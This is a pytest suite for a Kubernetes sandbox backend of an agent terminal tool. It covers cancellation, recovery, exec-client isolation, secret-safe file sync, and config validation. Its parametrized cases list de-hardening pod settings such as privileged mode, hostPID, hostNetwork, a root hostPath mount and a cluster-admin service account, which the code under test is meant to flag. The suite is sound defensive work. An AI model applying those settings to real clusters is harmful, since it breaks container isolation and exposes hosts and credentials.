def test_persistent_cancel_closes_stream_without_deleting_pod(monkeypatch):
    """The PR left cancel() a no-op for persistent sessions, leaking the exec
    thread, its websocket and a pipe fd for the full command duration."""
    client = _FakeWSClient(open_cycles=10_000)
    env = _make_k8s_env(monkeypatch, [("", 0), client], persistent=True)
    handle = env._run_bash("sleep 3600")
    handle.kill()
    assert client.closed is True
    env._provisioner.destroy.assert_not_called()
    assert env._pod_ref is not None


def test_session_recovers_when_the_pod_disappears(monkeypatch):
    """activeDeadlineSeconds / an operator TTL / an eviction can delete the pod
    under us. Without this the session bricks: every later command 404s with
    empty output until the idle reaper evicts the environment."""
    from kubernetes.client.exceptions import ApiException

    gone = _FakeWSClient(raise_on_update=ApiException(status=404, reason="Not Found"))
    env = _make_k8s_env(monkeypatch, [("", 0), gone, ("", 0), ("back\n", 0)])
    env.execute("ls")
    assert env._pod_ref is None

    env._provisioner.ensure.reset_mock()
    result = env.execute("echo back")
    env._provisioner.ensure.assert_called_once()
    assert env._pod_ref is not None
    assert "back" in result["output"]


def test_kill_racing_stream_open_is_not_erased(monkeypatch):
    """exec_fn used to set _cancelled = False AFTER _open_stream returned, so a
    kill() that landed while the stream was still opening was erased and the
    command kept running."""
    env = _make_k8s_env(monkeypatch, [("", 0)])
    opening = threading.Event()
    release = threading.Event()
    client = _FakeWSClient(open_cycles=10_000)

    def slow_stream(*args, **kwargs):
        opening.set()
        release.wait(5)
        return client

    monkeypatch.setattr("kubernetes.stream.stream", slow_stream)
    handle = env._run_bash("sleep 3600")
    assert opening.wait(5)
    handle.kill()          # cancel() runs with _active_stream still None
    release.set()
    assert handle.wait(timeout=5) == 130
    assert client.closed is True


def test_failed_ensure_does_not_orphan_a_pod(monkeypatch):
    monkeypatch.setattr("tools.environments.base.is_interrupted", lambda: False)
    provisioner = MagicMock()
    provisioner.namespace = "hermes"
    provisioner.workspace_name.return_value = "hermes-ws-abc"
    provisioner.ensure.side_effect = TimeoutError("not Ready after 120s")

    with pytest.raises(TimeoutError):
        KubernetesEnvironment(
            provisioner=provisioner, task_id="abc", persistent=False,
            image="img:1", cwd="/workspace", timeout=30, sync_files=False,
        )
    provisioner.destroy.assert_called_once()


def test_agent_visible_cache_base_is_stable_across_cd(monkeypatch):
    env = _make_k8s_env(monkeypatch, [("", 0)])
    base = env.agent_visible_cache_base()
    env.cwd = "/somewhere/else"
    assert env.agent_visible_cache_base() == base == "/workspace/.hermes"


# ---------------------------------------------------------------------------
# terminal_tool integration
# ---------------------------------------------------------------------------


def _install_fake_backend(monkeypatch):
    captured = {}

    class _FakeEnv:
        def __init__(self, **kwargs):
            captured.update(kwargs)

    import tools.environments.kubernetes as k8s_mod

    import tools.environments.kubernetes_sandbox as sandbox_mod

    monkeypatch.setattr(k8s_mod, "KubernetesEnvironment", _FakeEnv)
    monkeypatch.setattr(
        k8s_mod, "PodProvisioner", lambda *a, **kw: MagicMock(name="pod")
    )
    monkeypatch.setattr(
        sandbox_mod, "SandboxProvisioner", lambda *a, **kw: MagicMock(name="sandbox")
    )
    monkeypatch.setattr(
        k8s_mod, "load_kubernetes_apis", lambda kcfg: (MagicMock(), MagicMock())
    )
    monkeypatch.setattr(k8s_mod, "resolve_owner_reference", lambda *a, **kw: None)
    return captured, _FakeEnv


def test_factory_builds_kubernetes_env(monkeypatch):
    import tools.terminal_tool as tt

    captured, fake_cls = _install_fake_backend(monkeypatch)
    env = tt._create_environment(
        env_type="kubernetes", image="img:1", cwd="/workspace", timeout=30,
        container_config={"container_persistent": False,
                          "kubernetes": {"namespace": "hermes"}},
        task_id="abc",
    )
    assert isinstance(env, fake_cls)
    assert captured["task_id"] == "abc"
    assert captured["persistent"] is False


def test_factory_k8s_defaults_ephemeral_even_when_container_persistent_true(monkeypatch):
    import tools.terminal_tool as tt

    captured, _ = _install_fake_backend(monkeypatch)
    tt._create_environment(
        env_type="kubernetes", image="img:1", cwd="/workspace", timeout=30,
        container_config={"container_persistent": True,
                          "kubernetes": {"namespace": "hermes"}},
        task_id="abc",
    )
    assert captured["persistent"] is False


def test_factory_k8s_persistent_opt_in(monkeypatch):
    import tools.terminal_tool as tt

    captured, _ = _install_fake_backend(monkeypatch)
    tt._create_environment(
        env_type="kubernetes", image="img:1", cwd="/workspace", timeout=30,
        container_config={"kubernetes": {"namespace": "hermes", "persistent": True}},
        task_id="abc",
    )
    assert captured["persistent"] is True


def test_factory_selects_sandbox_provisioner(monkeypatch):
    import tools.terminal_tool as tt
    import tools.environments.kubernetes_sandbox as sandbox_mod

    _install_fake_backend(monkeypatch)
    seen = {}
    monkeypatch.setattr(
        sandbox_mod, "SandboxProvisioner",
        lambda *a, **kw: seen.setdefault("sandbox", MagicMock()),
    )
    tt._create_environment(
        env_type="kubernetes", image="img:1", cwd="/workspace", timeout=30,
        container_config={"kubernetes": {"namespace": "hermes",
                                         "provisioner": "sandbox"}},
        task_id="abc",
    )
    assert "sandbox" in seen


@pytest.mark.parametrize("kubernetes_config, expected", [
    ({"provisioner": "operator"}, "provisioner"),
    # A reserved pod_template field. Nothing may be provisioned from a config
    # whose reserved core Hermes would otherwise have to overwrite.
    ({"pod_template": {"spec": {"restartPolicy": "Always"}}}, "restartPolicy"),
    ({"pod_template": {"spec": {"containers": [
        {"name": "workspace", "args": ["--boom"]}]}}}, "args"),
    # An operator-authored pod shape. The judge now also flags this, but the
    # factory refusing it FIRST is what makes the whole path safe, and nothing
    # tested that: if the validate-then-raise in _create_environment were ever
    # moved or made advisory, the suite stayed green while an unjudgeable pod
    # reached the cluster.
    ({"provisioner": "sandbox",
      "sandbox": {"spec": {"sandboxTemplateRef": {"name": "privileged"}}}},
     "sandboxTemplateRef"),
    # A key the hard cut deleted.
    ({"runtime_class_name": "kata"}, "runtime_class_name"),
])
def test_factory_rejects_invalid_config(monkeypatch, kubernetes_config, expected):
    import tools.terminal_tool as tt

    _install_fake_backend(monkeypatch)
    with pytest.raises(ValueError, match=expected):
        tt._create_environment(
            env_type="kubernetes", image="img:1", cwd="/workspace", timeout=30,
            container_config={"kubernetes": {"namespace": "hermes",
                                             **kubernetes_config}},
            task_id="abc",
        )


def test_check_requirements_kubernetes_missing_client(monkeypatch):
    import tools.terminal_tool as tt

    monkeypatch.setattr(tt, "_get_env_config", lambda: {"env_type": "kubernetes"})
    import importlib.util as _ilu

    real_find_spec = _ilu.find_spec

    def fake_find_spec(name, *a, **k):
        if name == "kubernetes":
            return None
        return real_find_spec(name, *a, **k)

    monkeypatch.setattr(tt.importlib.util, "find_spec", fake_find_spec)
    assert tt.check_terminal_requirements() is False


def test_check_requirements_kubernetes_present(monkeypatch):
    import tools.terminal_tool as tt

    monkeypatch.setattr(
        tt, "_get_env_config",
        lambda: {"env_type": "kubernetes", "kubernetes": {"namespace": "hermes"}},
    )
    monkeypatch.setattr(tt.importlib.util, "find_spec", lambda name, *a, **k: object())
    assert tt.check_terminal_requirements() is True


def test_check_requirements_rejects_invalid_config(monkeypatch):
    import tools.terminal_tool as tt

    monkeypatch.setattr(
        tt, "_get_env_config",
        lambda: {"env_type": "kubernetes", "kubernetes": {"provisioner": "nope"}},
    )
    monkeypatch.setattr(tt.importlib.util, "find_spec", lambda name, *a, **k: object())
    assert tt.check_terminal_requirements() is False


def test_live_terminal_tool_kubernetes_image_and_container_config(monkeypatch):
    """Regression pin for the two spots the upstream PR missed at first: the
    image-selection ladder and the container_config builder in terminal_tool().

    Drives the real terminal_tool() entry path with _create_environment stubbed,
    so no cluster is needed.
    """
    import uuid

    import tools.terminal_tool as tt

    unique_task_id = f"k8s-regression-{uuid.uuid4().hex}"
    with tt._env_lock:
        tt._active_environments.pop(unique_task_id, None)
        # _resolve_container_task_id collapses non-isolation task ids back to
        # "default", so a cached env another test left there would be reused and
        # _create_environment never called.
        tt._active_environments.pop("default", None)

    captured = {}

    def _fake_create_environment(**kwargs):
        captured.update(kwargs)
        mock_env = MagicMock()
        mock_env.execute.return_value = {"output": "", "returncode": 0}
        return mock_env

    monkeypatch.setattr(tt, "_create_environment", _fake_create_environment)
    monkeypatch.setattr(tt, "_check_all_guards", lambda *a, **kw: {"approved": True})
    monkeypatch.setattr(tt, "_start_cleanup_thread", lambda: None)

    monkeypatch.setenv("TERMINAL_ENV", "kubernetes")
    # The ONLY kubernetes env var: the internal JSON bridge payload. There is
    # deliberately no TERMINAL_KUBERNETES_POD_SA / _IMAGE / _NAMESPACE.
    monkeypatch.setenv(
        "TERMINAL_KUBERNETES",
        json.dumps({"namespace": "hermes", "container_name": "devbox",
                    "image": "quay.io/hermes/session:1"}),
    )

    # An isolation-keyed override keeps _resolve_container_task_id from
    # collapsing this session onto the shared "default" container.
    tt._task_env_overrides[unique_task_id] = {"env_type": "kubernetes"}
    try:
        tt.terminal_tool(command="echo hi", task_id=unique_task_id, force=True)
    finally:
        with tt._env_lock:
            tt._active_environments.pop(unique_task_id, None)
        tt._task_env_overrides.pop(unique_task_id, None)

    assert captured, "_create_environment was never called"
    assert captured["image"] == "quay.io/hermes/session:1"
    cc = captured.get("container_config")
    assert cc is not None, "container_config was None — kubernetes missing from the builder"
    assert cc["kubernetes"]["container_name"] == "devbox"
    assert cc["kubernetes"]["namespace"] == "hermes"
    # Defaults survive a partial payload.
    assert cc["kubernetes"]["provisioner"] == "pod"


def test_kubernetes_backend_default_cwd_is_the_mount_path(monkeypatch):
    import tools.terminal_tool as tt

    monkeypatch.setattr(tt, "_ensure_terminal_env_bridged", lambda: None)
    monkeypatch.setenv("TERMINAL_ENV", "kubernetes")
    monkeypatch.delenv("TERMINAL_CWD", raising=False)
    monkeypatch.setenv("TERMINAL_KUBERNETES", json.dumps({"mount_path": "/home/agent"}))
    cfg = tt._get_env_config()
    assert cfg["cwd"] == "/home/agent"
    assert cfg["kubernetes"]["mount_path"] == "/home/agent"


def test_stale_kubernetes_payload_does_not_break_other_backends(monkeypatch):
    """Bridged container-only env vars must not be parsed when another backend
    is selected — a malformed value would otherwise kill the local terminal."""
    import tools.terminal_tool as tt

    monkeypatch.setattr(tt, "_ensure_terminal_env_bridged", lambda: None)
    monkeypatch.setenv("TERMINAL_ENV", "local")
    monkeypatch.setenv("TERMINAL_KUBERNETES", "{not json")
    cfg = tt._get_env_config()
    assert cfg["env_type"] == "local"
    assert cfg["kubernetes"] == {}


def test_kubernetes_is_a_container_backend():
    """Membership drives cwd sanitization, container_config assembly and the
    file-tool path translation."""
    import tools.terminal_tool as tt

    assert "kubernetes" in tt._CONTAINER_BACKENDS


# ---------------------------------------------------------------------------
# Exec client isolation  (CRITICAL: stream() monkeypatches api_client.request)
# ---------------------------------------------------------------------------


class _RecordingApiClient:
    """ApiClient stand-in that exposes the ``request`` attribute stream() swaps."""

    def __init__(self, configuration=None):
        self.configuration = configuration
        self.request = "REST"
        self.closed = False

    def close(self):
        self.closed = True


class _RecordingCoreV1Api:
    """Real class (not a Mock) so ``api_method.__self__`` resolves, like the SDK."""

    def __init__(self, api_client=None):
        self.api_client = api_client if api_client is not None else _RecordingApiClient()

    def connect_get_namespaced_pod_exec(self, *args, **kwargs):  # pragma: no cover
        raise AssertionError("stream() is stubbed in these tests")


def _sdk_like_stream(seen, barrier=None):
    """Reproduce what kubernetes.stream.stream() actually does.

    It is not a wrapper: it MONKEYPATCHES ``api_client.request`` with a
    websocket implementation and restores it in a ``finally`` — which is not
    reentrant.
    """

    def _stream(api_method, *args, **kwargs):
        client = api_method.__self__.api_client
        seen.append(client)
        previous = client.request
        client.request = "WEBSOCKET"
        try:
            if barrier is not None:
                barrier.wait(timeout=5)
            return _FakeWSClient(open_cycles=1)
        finally:
            client.request = previous

    return _stream


def _use_recording_client(monkeypatch):
    import kubernetes.client as kclient

    monkeypatch.setattr(kclient, "ApiClient", _RecordingApiClient)
    monkeypatch.setattr(kclient, "CoreV1Api", _RecordingCoreV1Api)


def test_every_exec_gets_its_own_api_client(monkeypatch):
    """The provisioner's CoreV1Api must never be handed to stream()."""
    shared = _RecordingCoreV1Api(_RecordingApiClient(configuration="CFG"))
    env = _make_k8s_env(monkeypatch, [("", 0)], api=shared)

    seen = []
    _use_recording_client(monkeypatch)
    monkeypatch.setattr("kubernetes.stream.stream", _sdk_like_stream(seen))

    env._open_stream(["true"]).close()
    env._open_stream(["true"]).close()

    assert len(seen) == 2
    assert seen[0] is not seen[1], "each exec needs its own ApiClient"
    assert all(client is not shared.api_client for client in seen)
    # ... but the shared client's auth/config still applies.
    assert all(client.configuration == "CFG" for client in seen)
    # ... and the throwaway clients are not leaked.
    assert all(client.closed for client in seen)
    assert shared.api_client.request == "REST"


def test_concurrent_execs_do_not_poison_the_shared_api_client(monkeypatch):
    """Two overlapping execs on ONE ApiClient interleave stream()'s
    save/restore, and the second restore installs the websocket partial
    permanently — after which every provisioner REST call (create/read/delete
    pod) tries to open a websocket against a plain HTTPS URL. Concurrency is
    routine here: gateway/TUI/desktop sessions collapse to one environment and
    the idle reaper calls cleanup() from another thread."""
    shared = _RecordingCoreV1Api(_RecordingApiClient(configuration="CFG"))
    env = _make_k8s_env(monkeypatch, [("", 0)], api=shared)

    seen = []
    barrier = threading.Barrier(2)
    _use_recording_client(monkeypatch)
    monkeypatch.setattr("kubernetes.stream.stream", _sdk_like_stream(seen, barrier))

    errors = []

    def _exec():
        try:
            env._open_stream(["true"]).close()
        except Exception as exc:  # pragma: no cover - surfaced by the assert
            errors.append(exc)

    threads = [threading.Thread(target=_exec) for _ in range(2)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(timeout=10)

    assert not errors
    assert shared.api_client.request == "REST", (
        "the shared ApiClient was permanently poisoned by overlapping execs"
    )
    assert len(set(id(client) for client in seen)) == 2


# ---------------------------------------------------------------------------
# Container-name resolution: the exec target is KNOWN, not guessed
# ---------------------------------------------------------------------------


def test_container_name_is_configurable_and_reaches_the_manifest():
    template = render_pod_template(
        _kcfg(container_name="devbox"), persistent=False, image="img:1",
        resources=Resources(), pvc_name="pvc",
    )
    assert template["spec"]["containers"][0]["name"] == "devbox"


def test_pod_ensure_targets_the_configured_container():
    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod(containers=("devbox",))
    p = _provisioner_with_api(api, container_name="devbox")
    ref = p.ensure("abc", persistent=False, image="img:1", resources=Resources())
    assert ref.container == "devbox"


def test_exec_container_prefers_the_configured_name_when_the_pod_has_it():
    p = _provisioner_with_api(MagicMock())
    pod = _running_pod(containers=("istio-proxy", "workspace"))
    assert p.exec_container(pod) == "workspace"


def test_exec_container_refuses_a_pod_whose_container_list_is_unreadable():
    """Fail-open is the wrong default for a check whose whole purpose is to
    prove the RUNNING pod matches the submitted one. "We could not establish
    that the pod carries the container we rendered" is the same failure as "it
    carries a different one" — most plausible on the sandbox path, where the
    pod is resolved from an operator status shape or a label lookup rather
    than from an object this backend created."""
    p = _provisioner_with_api(MagicMock())
    with pytest.raises(RuntimeError, match="did not render"):
        p.exec_container(SimpleNamespace())
    with pytest.raises(RuntimeError, match="did not render"):
        p.exec_container(SimpleNamespace(spec=SimpleNamespace(containers=[])))


def test_exec_container_refuses_a_pod_that_lacks_the_rendered_container():
    """The old code silently exec'd into names[0]. With container_name reserved
    and every pod rendered here, a missing container means the object that RAN
    is not the object that was rendered and judged — exec-ing into whatever
    else is there is that drift, silently."""
    p = _provisioner_with_api(MagicMock())
    pod = _running_pod(containers=("istio-proxy", "somebody-elses-shell"))
    with pytest.raises(RuntimeError, match="did not render"):
        p.exec_container(pod)


def test_container_name_is_validated_as_an_rfc1123_name():
    assert any(
        "container_name" in problem
        for problem in validate_kubernetes_config(_kcfg(container_name="Not Valid"))
    )


# ---------------------------------------------------------------------------
# Unknown exit status is a failure, not a success
# ---------------------------------------------------------------------------


def test_unknown_exit_status_is_reported_as_failure(monkeypatch):
    """WSClient.returncode raises (empty error channel) or returns None (stream
    still open). Both mean "unknown" — reporting 0 told the model a failed or
    half-killed command had succeeded."""
    client = _FakeWSClient(stdout="partial output\n",
                           returncode=TypeError("NoneType not subscriptable"))
    env = _make_k8s_env(monkeypatch, [("", 0), client])
    result = env.execute("something")
    assert "partial output" in result["output"]
    assert result["returncode"] != 0
    assert "status unavailable" in result["output"]


def test_exec_capture_raises_instead_of_reading_a_running_returncode(monkeypatch):
    env = _make_k8s_env(monkeypatch, [("", 0)])
    stuck = _FakeWSClient(open_cycles=10_000, returncode=None, update_sleep=0.05)
    monkeypatch.setattr("kubernetes.stream.stream", lambda *a, **k: stuck)
    with pytest.raises(TimeoutError):
        env._exec_capture(["sh", "-c", "sleep 999"], timeout=1)


# ---------------------------------------------------------------------------
# File-sync transport (no payload in exec argv, failures are loud)
# ---------------------------------------------------------------------------


def _recording_sync_stream(commands, clients, returncodes):
    def _stream(*args, **kwargs):
        commands.append(list(kwargs.get("command") or ()))
        index = min(len(clients), len(returncodes) - 1)
        client = _FakeWSClient(returncode=returncodes[index])
        clients.append(client)
        return client

    return _stream


def test_bulk_upload_streams_the_payload_over_stdin_never_argv(monkeypatch, tmp_path):
    """ws_client.get_websocket_url appends every argv element to the exec
    request URL, and kube-apiserver records requestURI in the audit log at
    Metadata level and above. iter_sync_files() starts with the agent's
    credential files, so an argv transport writes them into the cluster audit
    log. The chunked-argv fallback that did this is gone."""
    secret = tmp_path / "creds.json"
    secret.write_bytes(b'{"api_key": "SUPER-SECRET-TOKEN"}' * 400)  # > one argv chunk

    env = _make_k8s_env(monkeypatch, [("", 0)])
    commands, clients = [], []
    monkeypatch.setattr(
        "kubernetes.stream.stream", _recording_sync_stream(commands, clients, [0])
    )

    env._bulk_upload([(str(secret), "/workspace/.hermes/creds.json")])

    argv = " ".join(" ".join(command) for command in commands)
    assert "SUPER-SECRET-TOKEN" not in argv
    assert all(
        len(part) < 1024 for command in commands for part in command
    ), "the payload must never travel through exec argv (apiserver audit log)"

    written = "".join(clients[-1].stdin_writes)
    assert written.rstrip().endswith("__HERMES_TAR_EOF__")
    payload = base64.b64decode(written.split("__HERMES_TAR_EOF__")[0])
    with tarfile.open(fileobj=io.BytesIO(payload)) as tar:
        member = tar.getmember("workspace/.hermes/creds.json")
        assert tar.extractfile(member).read() == secret.read_bytes()


def test_no_argv_chunking_fallback_remains():
    assert not hasattr(KubernetesEnvironment, "_upload_tar_base64")


def test_stdin_upload_half_closes_when_v5_is_available(monkeypatch):
    env = _make_k8s_env(monkeypatch, [("", 0)])
    client = _FakeWSClient(returncode=0, subprotocol="v5.channel.k8s.io")
    monkeypatch.setattr("kubernetes.stream.stream", lambda *a, **k: client)
    env._stdin_upload("Zm9v\n")
    assert client.channels_closed == [0]


def test_bulk_upload_treats_an_unknown_exit_status_as_failure(monkeypatch, tmp_path):
    """`if rc not in (0, None)` whitelisted None as success, so a timed-out or
    abnormally-closed tar extract reported a completed upload."""
    payload = tmp_path / "a.txt"
    payload.write_text("x")
    env = _make_k8s_env(monkeypatch, [("", 0)])
    commands, clients = [], []
    monkeypatch.setattr(
        "kubernetes.stream.stream",
        _recording_sync_stream(commands, clients,
                               [0, TypeError("empty error channel")]),
    )
    with pytest.raises(RuntimeError, match="unknown"):
        env._bulk_upload([(str(payload), "/workspace/a.txt")])


def test_stdin_upload_raises_when_the_deadline_expires(monkeypatch):
    env = _make_k8s_env(monkeypatch, [("", 0)])
    stuck = _FakeWSClient(open_cycles=10_000, returncode=None, update_sleep=0.05)
    monkeypatch.setattr("kubernetes.stream.stream", lambda *a, **k: stuck)
    with pytest.raises(TimeoutError):
        env._stdin_upload("Zm9v\n", timeout=1)


def test_failed_upload_does_not_mark_files_as_synced(monkeypatch, tmp_path):
    """FileSyncManager commits its state whenever the transport returns without
    raising. A silent failure therefore marked the credential files as synced
    and never retried them — the session pod runs without them, with nothing in
    the logs."""
    from tools.environments.file_sync import FileSyncManager

    creds = tmp_path / "creds.json"
    creds.write_text("secret")
    env = _make_k8s_env(monkeypatch, [("", 0)])
    commands, clients = [], []
    monkeypatch.setattr(
        "kubernetes.stream.stream",
        _recording_sync_stream(commands, clients,
                               [0, TypeError("empty error channel")]),
    )
    manager = FileSyncManager(
        get_files_fn=lambda: [(str(creds), "/workspace/.hermes/creds.json")],
        upload_fn=env._upload_file,
        delete_fn=env._delete_files,
        bulk_upload_fn=env._bulk_upload,
    )
    manager.sync(force=True)
    assert manager._synced_files == {}, (
        "a failed upload must not be recorded as synced"
    )


# ---------------------------------------------------------------------------
# Approval trust: derived from the BUILT pod template
# ---------------------------------------------------------------------------


def _has_host_access(**overrides):
    from tools.terminal_tool import _kubernetes_has_host_access

    return _kubernetes_has_host_access({"kubernetes": _kcfg(**overrides)})


def test_default_ephemeral_pod_is_a_throwaway_sandbox():
    from tools.environments.kubernetes import unhardened_reasons

    assert unhardened_reasons(_kcfg()) == []
    assert _has_host_access() is False


@pytest.mark.parametrize("overrides, expected", [
    ({"persistent": True}, "persistent"),
    ({"pod_template": {"spec": {"automountServiceAccountToken": True}}},
     "automountServiceAccountToken"),
    ({"pod_template": {"spec": {"serviceAccountName": "cluster-admin-sa"}}},
     "serviceAccountName"),
    ({"pod_template": {"spec": {"securityContext": {"runAsNonRoot": False}}}},
     "runAsNonRoot"),
    ({"pod_template": {"spec": {"containers": [
        {"name": "workspace",
         "securityContext": {"allowPrivilegeEscalation": True}}]}}},
     "privilege escalation"),
    ({"pod_template": {"spec": {"containers": [
        {"name": "workspace",
         "securityContext": {"capabilities": {"drop": ["NET_RAW"]}}}]}}},
     "drop ALL"),
    ({"pod_template": {"spec": {"containers": [
        {"name": "workspace", "securityContext": {"privileged": True}}]}}},
     "privileged"),
    ({"pod_template": {"spec": {"containers": [
        {"name": "workspace", "securityContext": {"runAsUser": 0}}]}}},
     "run as root"),
    ({"pod_template": {"spec": {"hostPID": True}}}, "hostPID"),
    ({"pod_template": {"spec": {"hostNetwork": True}}}, "hostNetwork"),
    ({"pod_template": {"spec": {"volumes": [
        {"name": "host", "hostPath": {"path": "/"}}]}}}, "host"),
    ({"pod_template": {"spec": {"volumes": [
        {"name": "creds", "secret": {"secretName": "s"}}]}}}, "creds"),
])
def test_dehardened_pods_keep_the_dangerous_command_guards(overrides, expected):
    """The heuristic used to read three config keys, so a de-hardened pod — root,
    privilege escalation, a mounted token, a privileged SA — silently kept the
    approval-skip that only a throwaway sandbox earns.  The judge reads the
    RENDERED template, so it sees every one of these."""
    from tools.environments.kubernetes import unhardened_reasons

    reasons = unhardened_reasons(_kcfg(**overrides))
    assert any(expected in reason for reason in reasons), reasons
    assert _has_host_access(**overrides) is True


def test_a_reserved_violation_makes_the_pod_unhardened_not_hardened():
    """Fail-closed: render_pod_template raises on a reserved field, and
    unhardened_reasons turns the raise into "could not be rendered". An
    unvalidated violating config must never earn the approval skip."""
    from tools.environments.kubernetes import unhardened_reasons

    overrides = {"pod_template": {"spec": {"restartPolicy": "Always"}}}
    reasons = unhardened_reasons(_kcfg(**overrides))
    assert any("could not be rendered" in reason for reason in reasons), reasons
    assert _has_host_access(**overrides) is True


def test_approval_layer_keeps_guards_when_host_access_is_true():
    from tools.approval import _should_skip_container_guards

    assert _should_skip_container_guards("kubernetes", has_host_access=True) is False
    assert _should_skip_container_guards("kubernetes", has_host_access=False) is True


def test_host_access_evaluation_fails_closed(monkeypatch):
    import tools.environments.kubernetes as k8s_mod
    from tools.terminal_tool import _kubernetes_has_host_access

    def _boom(_kcfg):
        raise RuntimeError("schema exploded")

    monkeypatch.setattr(k8s_mod, "unhardened_reasons", _boom)
    assert _kubernetes_has_host_access({"kubernetes": {}}) is True


def test_docker_host_access_dispatches_to_the_kubernetes_evaluator():
    from tools.terminal_tool import _docker_has_host_access

    assert _docker_has_host_access(
        {"env_type": "kubernetes", "kubernetes": _kcfg(persistent=True)}
    ) is True


# ---------------------------------------------------------------------------
# Reserved core: REJECTED, not silently overwritten (issue requirement 5)
# ---------------------------------------------------------------------------


MANAGED_BY = "app.kubernetes.io/managed-by"


@pytest.mark.parametrize("pod_template, expected", [
    # R1 — the selector NetworkPolicy, the admission policy and pod adoption
    # all match on.
    ({"metadata": {"labels": {MANAGED_BY: "Helm"}}},
     "pod_template.metadata.labels"),
    # R2 — a restart swaps the container out from under an open exec session.
    ({"spec": {"restartPolicy": "Always"}}, "pod_template.spec.restartPolicy"),
    # ...by PRESENCE, not value: the base's own value is still a violation.
    ({"spec": {"restartPolicy": "Never"}}, "pod_template.spec.restartPolicy"),
    # R3 — a containers list that omits the exec target.
    ({"spec": {"containers": [{"name": "sidecar"}]}},
     "does not declare a container named 'workspace'"),
    # R4 — the long-running command that outlives the session.
    ({"spec": {"containers": [{"name": "workspace", "command": ["bash"]}]}},
     "containers[name=workspace].command"),
    # ...and its other half. The kubelet builds the process as command + args,
    # so `args` alone turns the pinned `sleep infinity` into
    # `sleep infinity --boom`: the container exits non-zero at once and, under
    # the pinned restartPolicy: Never, the pod goes Failed. A pod that starts
    # and can never serve a command is precisely what reserving `command` was
    # supposed to prevent, so reserving only `command` did not deliver it.
    ({"spec": {"containers": [{"name": "workspace", "args": ["--boom"]}]}},
     "containers[name=workspace].args"),
    # R5 — the workspace mount cwd resolves against.
    ({"spec": {"containers": [{"name": "workspace", "volumeMounts": [
        {"name": "mine", "mountPath": "/workspace"}]}]}},
     "volumeMounts[mountPath=/workspace]"),
    # R6 — the other half of R5.
    ({"spec": {"volumes": [{"name": "workspace", "hostPath": {"path": "/"}}]}},
     "spec.volumes[name=workspace]"),
    # R1b — pod_manifest() only OVERWRITES ownerReferences when an agent
    # identity was resolvable, so out-of-cluster a supplied list was copied
    # verbatim into the submitted Pod, unreserved and unjudged.
    ({"metadata": {"ownerReferences": [{"uid": "attacker"}]}},
     "pod_template.metadata.ownerReferences"),
])
def test_reserved_pod_template_fields_are_rejected(pod_template, expected):
    """Hermes owns the fields that make exec possible. A config that sets one
    FAILS VALIDATION with the exact dotted path — it is not silently
    overwritten, which would make the user's YAML vanish without a word."""
    problems = validate_kubernetes_config(_kcfg(pod_template=pod_template))
    assert any(expected in p for p in problems), problems
    assert any("reserved" in p or "does not declare" in p for p in problems)
    # ...and the renderer re-checks, so an unvalidated config cannot slip past.
    with pytest.raises(ValueError):
        render_pod_template(
            _kcfg(pod_template=pod_template), persistent=False, image="i:1",
            resources=Resources(), pvc_name="pvc",
        )


@pytest.mark.parametrize("cr_spec, expected", [
    # S1 — a SECOND pod-template source is exactly how the judged object comes
    # to differ from the submitted object.
    ({"podTemplate": {"spec": {"hostPID": True}}}, "sandbox.spec.podTemplate"),
    # S2 — an operator-authored pod this backend never renders and cannot
    # evaluate. Flat rejection: there is no config key to redirect to.
    ({"sandboxTemplateRef": {"name": "privileged"}},
     "sandbox.spec.sandboxTemplateRef"),
])
def test_reserved_sandbox_spec_fields_are_rejected(cr_spec, expected):
    problems = validate_kubernetes_config(
        _kcfg(provisioner="sandbox", sandbox={"spec": cr_spec})
    )
    assert any(expected in p and "reserved" in p for p in problems), problems
    # ...and the CR builder re-checks, so an unvalidated config cannot post it.
    with pytest.raises(ValueError):
        _sandbox_cls()(
            _kcfg(provisioner="sandbox", sandbox={"spec": cr_spec}), "hermes",
            api=None, owner_reference=OWNER_REF, custom_api=None,
        ).sandbox_manifest("abc", persistent=False, image="i:1",
                           resources=Resources())


def test_the_session_container_cannot_be_made_to_exit():
    """The reserved core exists so the session pod outlives the session. With
    only `command` reserved, `args` reached the manifest and the rendered
    container became `sleep infinity --boom` — a pod that starts, fails, and
    can never serve a command, passing both the validator and the judge in
    silence."""
    from tools.environments.kubernetes import unhardened_reasons

    kcfg = _kcfg(pod_template={"spec": {"containers": [
        {"name": "workspace", "args": ["--boom"]}]}})
    assert any("args" in p for p in validate_kubernetes_config(kcfg))
    # Fails closed in the judge too, via the renderer's re-check.
    assert unhardened_reasons(kcfg)
    # And on the sandbox path, whose podTemplate is the same rendered object.
    sandbox = dict(kcfg, provisioner="sandbox")
    assert any("args" in p for p in validate_kubernetes_config(sandbox))
    assert unhardened_reasons(sandbox)


# ---------------------------------------------------------------------------
# The hard cut is LOUD (issue requirement 1)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("overrides, expected", [
    # The deleted keys. Silently accepting them made the cut a no-op:
    # `security_context.read_only_root_filesystem: true` simply became false.
    ({"security_context": {"read_only_root_filesystem": True}},
     "terminal.kubernetes.security_context"),
    ({"node_selector": {"a": "b"}}, "terminal.kubernetes.node_selector"),
    ({"runtime_class_name": "kata"}, "terminal.kubernetes.runtime_class_name"),
    # The renamed user layer.
    ({"pod_template_overrides": {"spec": {"hostPID": True}}},
     "terminal.kubernetes.pod_template_overrides"),
    # A plain typo.
    ({"totally_bogus_key": 1}, "terminal.kubernetes.totally_bogus_key"),
    # Enumerated sub-blocks are checked too...
    ({"volume": {"storageClassName": "fast"}},
     "terminal.kubernetes.volume.storageClassName"),
    ({"sandbox": {"template_ref": "t"}}, "terminal.kubernetes.sandbox.template_ref"),
])
def test_unknown_and_removed_config_keys_are_rejected_loudly(overrides, expected):
    """The API layer posts everything with field_validation=Strict precisely so
    nothing user-supplied is silently dropped. The config layer must not do the
    opposite: a config.yaml still carrying a deleted key validated clean,
    rendered without it and said nothing. `_migrate_to_34` is not a substitute —
    it fires once, only through hermes_cli, and only below _config_version 34,
    so a hand-authored, gateway-bridged, read-only-mounted or already-migrated
    config kept its stale keys forever."""
    problems = validate_kubernetes_config(_kcfg(**overrides))
    assert any(expected in p for p in problems), problems


def test_the_free_form_nodes_stay_open():
    """pod_template and sandbox.spec are free-form by construction — the
    unknown-key rule must not turn the ONE user layer into an enumerated
    schema, which is the design this refactor removed."""
    assert validate_kubernetes_config(_kcfg(pod_template={"spec": {
        "nodeSelector": {"kubernetes.io/arch": "amd64"},
        "runtimeClassName": "kata",
        "tolerations": [{"key": "sandbox", "operator": "Exists"}],
    }})) == []
